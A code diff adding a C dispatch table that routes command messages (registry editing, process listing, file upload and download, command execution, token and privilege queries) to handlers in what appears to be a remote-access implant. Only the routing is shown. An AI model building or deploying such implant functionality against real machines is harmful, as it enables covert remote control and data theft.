@@ -3883,3 +3883,64 @@ CLEANUP:
 
 	return;
 }
+
+SYSTEM_HANDLER* GetSystemHandler()
+{
+	LPVOID* HandlerList = NULL;
+
+	HandlerList = ALLOC(sizeof(LPVOID) * MsgEnd);
+	HandlerList[MsgEnvReq] = GetEnvHandler;
+	HandlerList[MsgGetPrivsReq] = GetPrivsHandler;
+	HandlerList[MsgCurrentTokenOwnerReq] = CurrentTokenOwnerHandler;
+	HandlerList[MsgIfconfigReq] = IfconfigHandler;
+	HandlerList[MsgNetstatReq] = NetstatHandler;
+	HandlerList[MsgPsReq] = PsHandler;
+	HandlerList[MsgTerminateReq] = TerminateHandler;
+	HandlerList[MsgRegistryReadReq] = RegistryReadHandler;
+	HandlerList[MsgRegistryWriteReq] = RegistryWriteHandler;
+	HandlerList[MsgRegistryCreateKeyReq] = RegistryCreateKeyHandler;
+	HandlerList[MsgRegistryDeleteKeyReq] = RegistryDeleteKeyHandler;
+	HandlerList[MsgRegistrySubKeysListReq] = RegistrySubKeysListHandler;
+	HandlerList[MsgRegistryListValuesReq] = RegistryListValuesHandler;
+	HandlerList[MsgServicesReq] = ServicesHandler;
+	HandlerList[MsgServiceDetailReq] = ServiceDetailHandler;
+	HandlerList[MsgStartServiceByNameReq] = StartServiceByNameHandler;
+	HandlerList[MsgPing] = PingHandler;
+	HandlerList[MsgLsReq] = LsHandler;
+	HandlerList[MsgDownloadReq] = DownloadHandler;
+	HandlerList[MsgUploadReq] = UploadHandler;
+	HandlerList[MsgCdReq] = CdHandler;
+	HandlerList[MsgPwdReq] = PwdHandler;
+	HandlerList[MsgRmReq] = RmHandler;
+	HandlerList[MsgMvReq] = MvHandler;
+	HandlerList[MsgCpReq] = CpHandler;
+	HandlerList[MsgMkdirReq] = MkdirHandler;
+	HandlerList[MsgExecuteReq] = ExecuteHandler;
+	
+	HandlerList[MsgTaskReq] = NULL;
+	HandlerList[MsgProcessDumpReq] = NULL;
+	HandlerList[MsgImpersonateReq] = NULL;
+	HandlerList[MsgRevToSelfReq] = NULL;
+	HandlerList[MsgRunAsReq] = NULL;
+	HandlerList[MsgInvokeGetSystemReq] = NULL;
+	HandlerList[MsgInvokeExecuteAssemblyReq] = NULL;
+	HandlerList[MsgInvokeInProcExecuteAssemblyReq] = NULL;
+	HandlerList[MsgInvokeMigrateReq] = NULL;
+	HandlerList[MsgSpawnDllReq] = NULL;
+	HandlerList[MsgStartServiceReq] = NULL;
+	HandlerList[MsgStopServiceReq] = NULL;
+	HandlerList[MsgRemoveServiceReq] = NULL;
+	HandlerList[MsgSetEnvReq] = NULL;
+	HandlerList[MsgUnsetEnvReq] = NULL;
+	HandlerList[MsgScreenshotReq] = NULL;
+	HandlerList[MsgSideloadReq] = NULL;
+	HandlerList[MsgMakeTokenReq] = NULL;
+	HandlerList[MsgReconfigureReq] = NULL;
+	HandlerList[MsgSSHCommandReq] = NULL;
+	HandlerList[MsgChtimesReq] = NULL;
+	HandlerList[MsgRegisterExtensionReq] = NULL;
+	HandlerList[MsgCallExtensionReq] = NULL;
+	HandlerList[MsgListExtensionsReq] = NULL;
+
+	return HandlerList;
+}
